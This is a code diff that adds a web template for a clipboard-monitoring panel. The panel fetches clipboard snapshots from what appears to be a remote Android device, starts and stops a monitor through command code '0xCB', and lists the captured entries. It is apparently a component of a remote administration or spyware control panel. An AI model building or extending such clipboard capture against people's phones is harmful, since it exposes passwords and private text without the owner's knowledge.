@@ -1,0 +1,92 @@
+<div class="ui segment">
+    <div class="ui secondary menu">
+        <div class="item">
+            <button class="ui violet button" onclick="requestClipboardSnapshot(this)">
+                <i class="sync alternate icon"></i>
+                Fetch Now
+            </button>
+        </div>
+        <div class="right menu">
+            <div class="item">
+                <div class="ui buttons">
+                    <button class="ui compact teal button" onclick="toggleClipboardMonitor(this, true)">
+                        <i class="play icon"></i>
+                        Start Monitor
+                    </button>
+                    <div class="or" data-text="/">
+                    </div>
+                    <button class="ui compact button" onclick="toggleClipboardMonitor(this, false)">
+                        <i class="pause icon"></i>
+                        Stop Monitor
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <table class="ui celled table">
+        <thead>
+            <tr>
+                <th>Time</th>
+                <th>Content</th>
+            </tr>
+        </thead>
+        <tbody>
+            <%
+                const clipboardStatus = pageData.status || {};
+                const entries = Array.isArray(pageData.entries) ? pageData.entries : [];
+            %>
+            <% if (clipboardStatus.lastError) { %>
+                <tr>
+                    <td colspan="2">
+                        <div class="ui orange message">
+                            <div class="header">Clipboard warning</div>
+                            <p><%= clipboardStatus.lastError %></p>
+                        </div>
+                    </td>
+                </tr>
+            <% } %>
+            <% if (clipboardStatus.lastUpdated) { %>
+                <tr>
+                    <td colspan="2">
+                        <div class="ui tiny grey message">
+                            <i class="history icon"></i>
+                            Last clipboard event: <%= new Date(clipboardStatus.lastUpdated).toLocaleString('en-GB', { timeZone: 'UTC' }) %>
+                        </div>
+                    </td>
+                </tr>
+            <% } %>
+            <% if (!entries.length) { %>
+                <tr>
+                    <td colspan="2">
+                        <div class="ui placeholder segment">
+                            <div class="ui icon header">
+                                <i class="clipboard outline icon"></i>
+                                No clipboard entries captured yet.
+                            </div>
+                            <p class="ui small text">Android 10+ limits background clipboard access unless the app is active or is the default input method.</p>
+                        </div>
+                    </td>
+                </tr>
+            <% } else { %>
+                <% entries.forEach((notification) => { 
+                        let date = new Date(notification.time);
+                    %>
+                <tr>
+                    <td class="collapsing"><%= date.toLocaleString('en-GB', { timeZone: 'UTC' }) %></td>
+                    <td><%= notification.content %></td>
+                </tr>
+                <% }) %>
+            <% } %>
+        </tbody>
+    </table>
+</div>
+
+<script>
+    function requestClipboardSnapshot(element) {
+        updateButton(element, '0xCB', { action: 'fetch' });
+    }
+
+    function toggleClipboardMonitor(element, shouldStart) {
+        updateButton(element, '0xCB', { action: shouldStart ? 'start' : 'stop' });
+    }
+</script>
